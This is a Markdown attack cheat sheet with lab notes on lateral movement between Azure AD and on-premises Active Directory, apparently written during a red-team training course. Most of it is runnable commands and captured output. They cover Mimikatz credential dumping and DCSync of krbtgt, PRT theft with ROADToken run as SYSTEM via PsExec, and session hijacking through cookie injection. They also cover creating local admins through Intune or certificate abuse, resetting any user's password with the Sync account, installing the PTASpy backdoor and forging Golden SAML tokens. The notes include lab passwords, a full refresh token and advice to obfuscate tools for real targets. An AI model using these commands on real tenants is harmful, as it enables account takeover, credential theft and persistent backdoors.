# Lateral movement

## Azure AD machine --> Azure (or another Azure AD Machine)
* [Pass the certificate](#Pass-the-certificate)
* [Pass the PRT](#Pass-the-PRT) 

## Azure AD --> On-prem
* [Intune](#Intune)
* [Application proxy abuse](#Application-proxy-abuse)

## On-Prem --> Azure AD
* [Azure AD Connect](#Azure-AD-Connect)
  * [Password Hash Sync (PHS) Abuse](#Password-Hash-Sync-Abuse)
  * [Pass Through Authentication (PTA) Abuse](#Pass-Through-Authentication-Abuse)
  * [Federation (ADFS)](#Federation-ADFS)

# Azure AD --> On-prem
## Pass the certificate
- To go from Azure AD machine to other Azure AD machine if the user has administrative access to other machines.

#### Check if machine is Azure AD Joined
- Check for IsDeviceJoined : YES
```
dsregcmd /status
```

#### Extract PRT, Session key (keyvalue) and Tenant ID  -- after Aug 2021, Mimiikatz is no longer working 
```
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
```

#### Extract context key, clearkey and derived key
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<keyvalue> /unprotect" "exit"'
```


### Now use below tool to extract PRT in the session of target AAD user 
```
ROADToken.exe 
SessionExecCommand  (need to be done in SYS privilege)


PS C:\AzAD\Tools> Copy-Item -ToSession $jumpvm -Path .\ROADToken.exe -Destination C:\Users\student199\Documents -Verbose
VERBOSE: Performing the operation "Copy File" on target "Item: C:\AzAD\Tools\ROADToken.exe Destination: C:\Users\student199\Documents".
PS C:\AzAD\Tools> Copy-Item -ToSession $jumpvm -Path .\PsExec64.exe -Destination C:\Users\student199\Documents -Verbose
VERBOSE: Performing the operation "Copy File" on target "Item: C:\AzAD\Tools\PsExec64.exe Destination: C:\Users\student199\Documents".
PS C:\AzAD\Tools> Copy-Item -ToSession $jumpvm -Path .\SessionExecCommand.exe -Destination C:\Users\student199\Documents -Verbose
VERBOSE: Performing the operation "Copy File" on target "Item: C:\AzAD\Tools\SessionExecCommand.exe Destination: C:\Users\student199\Documents".
PS C:\AzAD\Tools> Enter-PSSession -Session $jumpvm
[51.116.180.87]: PS C:\Users\student199\Documents> $infadminsrv
[51.116.180.87]: PS C:\Users\student199\Documents>
[51.116.180.87]: PS C:\Users\student199\Documents> $password=ConvertTo-SecureString 'Stud199Password@123' -AsPlainText -Force
[51.116.180.87]: PS C:\Users\student199\Documents> $cred = New-Object System.Management.Automation.PSCredential('.\student199',$password)
[51.116.180.87]: PS C:\Users\student199\Documents> $infradminsrv=New-PSSession -ComputerName 10.0.1.5 -Credential $cred



Copy file to infradminsrv

[51.116.180.87]: PS C:\Users\student199\Documents>
[51.116.180.87]: PS C:\Users\student199\Documents> Copy-Item -ToSession $infradminsrv -Path .\ROADToken.exe -Destination C:\Users\Public\student199 -Verbose
VERBOSE: Performing the operation "Copy File" on target "Item: C:\Users\student199\Documents\ROADToken.exe Destination: C:\Users\Public\student199".
[51.116.180.87]: PS C:\Users\student199\Documents> Copy-Item -ToSession $infradminsrv -Path .\PsExec64.exe -Destination C:\Users\Public\student199 -Verbose
VERBOSE: Performing the operation "Copy File" on target "Item: C:\Users\student199\Documents\PsExec64.exe Destination: C:\Users\Public\student199".
[51.116.180.87]: PS C:\Users\student199\Documents> Copy-Item -ToSession $infradminsrv -Path .\SessionExecCommand.exe -Destination C:\Users\Public\student199 -Verbose
VERBOSE: Performing the operation "Copy File" on target "Item: C:\Users\student199\Documents\SessionExecCommand.exe Destination: C:\Users\Public\student199".
[51.116.180.87]: PS C:\Users\student199\Documents>
//for real assessment, obfusficate the above tool first before landing to the target



Get challenge outside JUMPVM

//Generate the noun against OAUTH2/token endpoint

$Tennant="2d50cb29-5f7b-48a4-87ce-fe75a941adb6"

PS C:\AzAD\Tools> $URL="https://login.microsoftonline.com/$Tennant/oauth2/token"
PS C:\AzAD\Tools> $Params = @{
>>     "URI" = $URL
>>     "Method" = "POST"
>> }
PS C:\AzAD\Tools> Invoke-RestMethod @Params -UseBasicParsing -Body $Body

Nonce
-----
AwABAAEAAAACAOz_BAD0_xX3s2aQTi7a9AMJkY0NmME-eBsOLv-sEpPTRNF7pqR1n7ZGJq_Kzb8cdusCXhOpAhz9Kgp_7nkGiL_ZLgJrWVQgAA





How do we know MARK should be used to extract PRT ? 

Invoke-Command -Session $infradminsrc -ScriptBlock{GetProcess -IncludeUsername} 

	


It is also required to SYSTEM user to execute SessionExecComand  to get PRT

On the jumpvm
[51.116.180.87]: PS C:\Users\student199\Documents> Invoke-Command -Session $infradminsrv -ScriptBlock{C:\Users\Public\student199\PsExec64.exe -accepteula -s "cmd.exe" " /c C:\Users\Public\student199\SessionExecCommand.exe MichaelMBarron C:\Users\Public\student199\ROADToken.exe AwABAAEAAAACAOz_BAD0_xX3s2aQTi7a9AMJkY0NmME-eBsOLv-sEpPTRNF7pqR1n7ZGJq_Kzb8cdusCXhOpAhz9Kgp_7nkGiL_ZLgJrWVQgAA > C:\Users\Public\student199\PRT.txt"}




PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

Connecting to local system...
    + CategoryInfo          : NotSpecified: (Connecting to local system...:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
    + PSComputerName        : 10.0.1.5

NotSpecified: (:String) [], RemoteException
NotSpecified: (:String) [], RemoteException
Starting PSEXESVC service on local system...
NotSpecified: (:String) [], RemoteException
NotSpecified: (:String) [], RemoteException
Connecting with PsExec service on infradminsrv...
NotSpecified: (:String) [], RemoteException
NotSpecified: (:String) [], RemoteException
Starting cmd.exe on infradminsrv...
NotSpecified: (:String) [], RemoteException
NotSpecified: (:String) [], RemoteException
NotSpecified: (:String) [], RemoteException
cmd.exe exited on infradminsrv with error code 0.


[51.116.180.87]: PS C:\Users\student199\Documents> Invoke-Command -Session $infradminsrv -ScriptBlock{Get-Content -Path C:\Users\Public\student199\PRT.txt}
Exec'd command C:\Users\Public\student199\ROADToken.exe as user MichaelMBarron
stdOutput: Using nonce AwABAAEAAAACAOz_BAD0_xX3s2aQTi7a9AMJkY0NmME-eBsOLv-sEpPTRNF7pqR1n7ZGJq_Kzb8cdusCXhOpAhz9Kgp_7nkGiL_ZLgJrWVQgAA supplied on command line
stdOutput: L  { "response": [{ "name": "x-ms-RefreshTokenCredential", "data": "eyJhbGciOiJIUzI1NiIsICJrZGZfdmVyIjoyLCAiY3R4Ijoia3QzYVg1dzE3dE1UV28weVNnYjJINUV0Tm1HbXA3azMifQ.eyJyZWZyZXNoX3Rva2VuIjoiMC5BWEFBS2N0UUxYdGZwRWlIenY1MXFVR3R0b2M3cWpodG9CZElzblY2TVdtSTJUdHdBQ2suQWdBQkFBRUFBQUQtLURMQTNWTzdRcmRkZ0pnN1dldnJBZ0RzX3dRQTlQLWxFQ1hvWGo2R0tBdDQtN2RhdE16WHoxMkg2clJFNXVGai1RcGhsaDU3eEdrREJOLU9LeU1LMlBIMXM4eWM1X21Ic0xZNDFtbzU5a1pjUUpMbjVUbWJma3JIR2Z1ZUtZcDhfQW4zeGlocFBLUVRsWDAwVlhpZUVBdlMzOXAwc1hPN1lBRVk5UDFzVTd1eVRFU05nTUNSMlloRjlFbGZPT3U1eHM2QVpZR293M3diSTFUMnlYMHY1VS1yOTV5QzYzR2FwdUtmdmtLcmpGMHZMNmkyUFZsZ2Fhdi1iQzlwV3hGdS1ncVZabkRQbFVSUHA2WVRnN3pFUEs4VlVDQ05UYnVHSGlmY0VzdkpTZUdxYUthSjF6b0VzYkhVUmg3a2pWTFhHYUNzRHJDWVE2alprdW5RSUNBN1J5OWFaNzhfdnpRWmYxRFptU3JpUkY4MWJNVFJFZXpRR2FNOG1oMXZTTDhNTG5sWGNWLUc0QUVXaGV1N1hGbzJIZkh5UlEzZzlqeDFZQ3NMdGNEQnlscmNMR2ctelA5ZGlGNmxsVC00dUNqZW1BVW5SRFVQd1p1R0FMUWozaFVSVHlVV3JDUVE5Y3U5UEd4REx0bVJhcVN1Z2ZpTjBoNXhCVV9vZzcwWjFDdFExTS14VzM3SVVZTmdYUko0VWplRU8za09oeXRwMUhJMmNyeGFQaS1xS1hUdVlZa3paSlBKLWttTksxU1loR0ltSDk4OVJoSlU2UlFkeVFqN0RDb3hKRllHYWo3SnFVbnVJbFJ3TVVPa0paQ0dKU0JUbHlUMGhpWEVUWUpBc3BHNkdIUUJQeW81YkwzeWlCNUhDUUhLeVZfT08zNTBBdnYweVEzRUl5b0pCOUlHMzhvR2FfYlZHTzg3bERNM0lsYWNlVkxDZ2NteXNHU1V5VE1hV0hOZ29ybHRsUDFBa0g1b0h4Yl9FcnM1ZjkyNUdkSUpxRVVhc0I4anZKU29OazJFb3NrUmF3T1FOUkQwVUstRVJyQ2lpVE5rUUZBcUlkR01OYXk1YUJldnA2Y29XejFtbjdkZnlGRDBtNzM0ZTV2emtCb2pFb0tNbmlVLVpnbHloWUZpVkJNR0ZNNWpqdXZVNmh6WjZFbTYzbjVYdjhWODJpMFRLX1l0bi1PQiIsICJpc19wcmltYXJ5IjoidHJ1ZSIsICJyZXF1ZXN0X25vbmNlIjoiQXdBQkFBRUFBQUFDQU96X0JBRDBfeFgzczJhUVRpN2E5QU1Ka1kwTm1NRS1lQnNPTHYtc0VwUFRSTkY3cHFSMW43WkdKcV9LemI4Y2R1c0NYaE9wQWh6OUtncF83bmtHaUxfWkxnSnJXVlFnQUEifQ.cVlXlSkiGLRFnKXhlhc-G4Pvw_hZkfrpTdVKbsqy-ec", "p3pHeader": "CP=\"CAO DSP COR ADMa DEV CONo TELo CUR PSA PSD TAI IVDo OUR SAMi BUS DEM NAV STA UNI COM INT PHY ONL FIN PUR LOCi CNT\"", "flags": 8256 }] }
stdOutput: 0


You might need to repeat to get the challenge and get PRT.  



JWT decode

{
    "refresh_token": "0.AXAAKctQLXtfpEiHzv51qUGttoc7qjhtoBdIsnV6MWmI2TtwACk.AgABAAEAAAD--DLA3VO7QrddgJg7WevrAgDs_wQA9P-lECXoXj6GKAt4-7datMzXz12H6rRE5uFj-Qphlh57xGkDBN-OKyMK2PH1s8yc5_mHsLY41mo59kZcQJLn5TmbfkrHGfueKYp8_An3xihpPKQTlX00VXieEAvS39p0sXO7YAEY9P1sU7uyTESNgMCR2YhF9ElfOOu5xs6AZYGow3wbI1T2yX0v5U-r95yC63GapuKfvkKrjF0vL6i2PVlgaav-bC9pWxFu-gqVZnDPlURPp6YTg7zEPK8VUCCNTbuGHifcEsvJSeGqaKaJ1zoEsbHURh7kjVLXGaCsDrCYQ6jZkunQICA7Ry9aZ78_vzQZf1DZmSriRF81bMTREezQGaM8mh1vSL8MLnlXcV-G4AEWheu7XFo2HfHyRQ3g9jx1YCsLtcDBylrcLGg-zP9diF6llT-4uCjemAUnRDUPwZuGALQj3hURTyUWrCQQ9cu9PGxDLtmRaqSugfiN0h5xBU_og70Z1CtQ1M-xW37IUYNgXRJ4UjeEO3kOhytp1HI2crxaPi-qKXTuYYkzZJPJ-kmNK1SYhGImH989RhJU6RQdyQj7DCoxJFYGaj7JqUnuIlRwMUOkJZCGJSBTlyT0hiXETYJAspG6GHQBPyo5bL3yiB5HCQHKyV_OO350Avv0yQ3EIyoJB9IG38oGa_bVGO87lDM3IlaceVLCgcmysGSUyTMaWHNgorltlP1AkH5oHxb_Ers5f925GdIJqEUasB8jvJSoNk2EoskRawOQNRD0UK-ERrCiiTNkQFAqIdGMNay5aBevp6coWz1mn7dfyFD0m734e5vzkBojEoKMniU-ZglyhYFiVBMGFM5jjuvU6hzZ6Em63n5Xv8V82i0TK_Ytn-OB",
    "is_primary": "true",
    "request_nonce": "AwABAAEAAAACAOz_BAD0_xX3s2aQTi7a9AMJkY0NmME-eBsOLv-sEpPTRNF7pqR1n7ZGJq_Kzb8cdusCXhOpAhz9Kgp_7nkGiL_ZLgJrWVQgAA"
}





PS C:\AzAD\Tools> $password = ConvertTo-SecureString 'StudUserPassword@123' -AsPlainText -Force
>>
PS C:\AzAD\Tools> $creds = New-Object System.Management.Automation.PSCredential('studentUser', $password)
PS C:\AzAD\Tools> Enter-PSSession -ComputerName 172.16.2.24 -Credential $creds
[172.16.2.24]: PS C:\Users\studentUser\Documents> cat C:\Transcripts\20210422\PowerShell_transcript.DESKTOP-M7C1AFM.6sZJrDuN.20210422230739.txt
$Password = ConvertTo-SecureString 'UserIntendedToManageSyncWithCl0ud!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('adconnectadmin', $Password)
Enter-PSSession -ComputerName defres-adcnct -Credential $cred

//Microsoft Powershell system-wide transcript -> regardless of system management dll, the command and output into the transscript would capture the output and comand 

No need to get the IP address of the target machine here

[172.16.2.24]: PS C:\Users\studentUser\Documents> ping defres-adcnct

Pinging defres-adcnct [fe80::b9c7:7721:d798:c91d%14] with 32 bytes of data:
Reply from fe80::b9c7:7721:d798:c91d%14: time=4ms
Reply from fe80::b9c7:7721:d798:c91d%14: time<1ms
Reply from fe80::b9c7:7721:d798:c91d%14: time=1ms
Reply from fe80::b9c7:7721:d798:c91d%14: time=1ms

Ping statistics for fe80::b9c7:7721:d798:c91d%14:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 4ms, Average = 1ms



Lateral Movement - Intune - Cloud to On-Prem ( Micheal is INTUNE Administrator)   

Execute the script to add user to the local user and add it to the local admin group  against the registered device  (device is compliant from Azure Portal - conditional access policies)   via endpoint.microsoft.com UI levaraging on PRT cookie  -ms-xs-refreshTokenCredential 

PS C:\Windows\system32> hostname
DESKTOP-M7C1AFM

```

#### Request a certificate from PRT  - No longer working but BlackBlack US 2022 -MorRubin release a new technique
- https://github.com/morRubin/PrtToCert
- Code is modified in the lab
```
& 'C:\Program Files\Python39\python.exe' RequestCert.py --tenantId <TENANT ID> --prt <PRT VALUE> --userName <USERNAME> --hexCtx <CONTEXT KEY VALUE> --hexDerivedKey <DERIVED KEY VALUE>
```

#### Use certificate to add a user with administrative privileges
- Code is modified in the lab
- https://github.com/morRubin/AzureADJoinedMachinePTC
```
python \AzureADJoinedMachinePTC\Main.py --usercert <PATH TO .pfx FILE> --certpass AzureADCert --remoteip <TARGET IP> --command "cmd.exe /c net user <USERNAME> <PASSWORD> /add /Y && net localgroup administrators <USERNAME> /add"
```

#### Use psremoting to access the machine

## Pass the PRT
#### Extract PRT, Session key (keyvalue) and Tenant ID
```
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::cloudap" ""exit"'
```

#### Extract context key, clearkey and derived key
```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "dpapi::cloudapkd /keyvalue:<KEY VALUE> /unprotect" "exit"'
```

#### Request access token (cookie) to all applications
```
Import-Module .\AADInternals.psd1

$tempPRT = '<PRT>'
while($tempPRT.Length % 4) {$tempPRT += "="}
$PRT = [text.encoding]::UTF8.GetString([convert]::FromBase64String($tempPRT))

$ClearKey = "<CLEARKEY>"
$SKey = [convert]::ToBase64String( [byte[]] ($ClearKey -replace '..', '0x$&,' -split ',' -ne ''))

New-AADIntUserPRTToken -RefreshToken $PRT -SessionKey $SKey –GetNonce
```

#### Copy the value from above command and use it with a web browser
- Open the Browser in Incognito mode
- Go to https://login.microsoftonline.com/login.srf
- Press F12 (Chrome dev tools) -> Application -> Cookies
- Clear all cookies and then add one named `x-ms-RefreshTokenCredential` for https://login.microsoftonline.com and set its value to that retrieved from AADInternals
- Mark HTTPOnly and Secure for the cookie
- Visit https://login.microsoftonline.com/login.srf again and we will get access as the user!
- Can now also access portal.azure.com


## Intune
- a user with Global Administrator or Intune Administrator role can execute PowerShell scripts on an enrolled Windows device. The script runs with privileges of SYSTEM on the device.
- If user had Intune Administrator role go to https://endpoint.microsoft.com/#home and login (or from a ticket (PRT)
- Go to Devices -> All Devices to check devices enrolled to Intune:
- Go to Scripts and Click on Add for Windows 10. Create a new script and select a script
- Example script adduser.ps1

```
$passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
New-LocalUser -Name <USERNAME> -Password $passwd
Add-LocalGroupMember -Group Administrators -Member <USERNAME>
```

- Select `Run script in 64 bit PowerShell Host`
- On the assignment page select "Add all users" and "add all devices"

## Application proxy abuse
- The application behind the proxy may have vulnerabilities to access the on-prem environment.
#### Enumerate application which has a application proxy configured
```
Import-Module .\AzureAD.psd1
Get-AzureADApplication | %{try{Get-AzureADApplicationProxyApplication -ObjectId $_.ObjectID;$_.DisplayName;$_.ObjectID}catch{}}
```

#### Get the Service Principal (use the application name)
```
Get-AzureADServicePrincipal -All $true | ?{$_.DisplayName -eq "<APPLICATION NAME>"} 
```

#### Find user and groups assigned to the application
```
. .\Get-ApplicationProxyAssignedUsersAndGroups.ps1
Get-ApplicationProxyAssignedUsersAndGroups -ObjectId <OBJECT ID OF SERVICE PRINCIPAL>
```

#### Extract secrets of service account
- After compromising the application
```
Invoke-Mimikatz -Command '"token::elevate" "lsadump::secrets"'
```

# On-Prem --> Azure AD
## Azure AD Connect
- Check if there is an account name with `MSOL_<INSTALLATION ID>`. This user has DCSYNC rights. (or `AAD_` if installed on a DC)
- Command to check if AD connect is installed on the server `Get-ADSyncConnector`

## Password Hash Sync Abuse
- Account with `SYNC_` is created in Azure AD and can reset any users password in Azure AD.
- Passwords for both the accounts are stored in SQL server on the server where Azure AD Connect is installed and it is possible to extract them in clear-text if you have admin privileges on the server.

#### Enumerate server where Azure AD is installed (on prem command)
```
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" -Properties * | select SamAccountName,Description | fl
```

#### Enumerate server where Azure AD is installed (Azure command)
```
Import-Module .\AzureAD.psd1
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```

#### Extract credentials from the server
```
Import-Module .\AADInternals.psd1
Get-AADIntSyncCredentials
```

#### Run DCSync with creds of MSOL_* account
```
runas /netonly /user:<DOMAIN>\MSOL_<ID> cmd 
Invoke-Mimikatz -Command '"lsadump::dcsync/user:<DOMAIN>\krbtgt /domain:<DOMAIN> /dc:<DC NAME>"'
```

### Reset password of any user
- Using the Sync_* account we can reset password for any user. (Including Global Administrator and the user who created the tenant)

#### Using the creds, request an access token for AADGraph and save it to cache using the SYNC account.
```
Import-Module .\AADInternals.psd1
$passwd = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential ("<SYNC USERNAME>", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds -SaveToCache
```

#### Enumerate global admin
```
Get-AADIntGlobalAdmins
```

#### Get the ImmutableID
```
Get-AADIntUser -UserPrincipalName <NAME> | select ImmutableId
```

#### Reset the Azure password
```
Set-AADIntUserPassword -SourceAnchor "<IMMUTABLE ID>" -Password "<PASSWORD>" -Verbose
```

#### Reset password for cloud only user
- Need CloudAnchor ID which is the format ```<USER>_<OBJECTID>```
```
Import-Module .\AADInternals.psd1
 Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID
Set-AADIntUserPassword -CloudAnchor "<ID>" -Password "<PASSWORD>" -Verbose
```

- Access Azure portal using the new password.

## Pass Through Authentication PTA Abuse
- Once we have admin access to an Azure AD connect server running PTA agent.
- Not reliable method to check if PTA is used, Check if module is available ```Get-Command -Module PassthroughAuthPSModule```
- Once the backdoor is installed, we can authenticate as any user synced from on-prem without knowing the correct password!

#### Install a backdoor (needs to be run ad administrator)
```
Import-Module .\AADInternals.psd1
Install-AADIntPTASpy
```

### See passwords of on-prem users authenticating
- Stored in C:\PTASpy
```
Get-AADIntPTASpyLog -DecodePasswords
```

#### Register a new PTA agent
- After getting Global Administrator privileges by setting it on a attacker controled machine.
```
Import-Module .\AADInternals.psd1
Install-AADIntPTASpy
```

## Federation-ADFS
- Golden SAML Attack
#### Get the ImmutableID
```
[System.Convert]::ToBase64String((Get-ADUser -Identity onpremuser | select -ExpandProperty ObjectGUID).tobytearray())
```

#### On ADFS server (As administrator)
```
Get-AdfsProperties | select identifier
```

#### Check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
```
Get-MsolDomainFederationSettings -DomainName <DOMAIN> | select IssuerUri
```

#### Extract the ADFS token signing certificate
- With DA privileges on-prem
```
Import-Module .\AADInternals.psd1
Export-AADIntADFSSigningCertificate
```

#### Access cloud apps as any user
```
Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer <DOMAIN>/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```

### With DA privileges on-prem, it is possible to create ImmutableID of cloud only users!
#### Create a realistic ImmutableID
```
[System.Convert]::ToBase64String((New-Guid).tobytearray())
```

#### Export the token signing certificate
```
Import-Module .\AADInternals.psd1
Export-AADIntADFSSigningCertificate
```

#### Use the below command from AADInternals to access cloud apps as the user whose immutableID is specified 
```
Open-AADIntOffice365Portal -ImmutableID <IMMUTABLE ID> -Issuer <DOMAIN>/adfs/services/trust -PfxFileName <PATH TO .pfx FILE> -Verbose
```
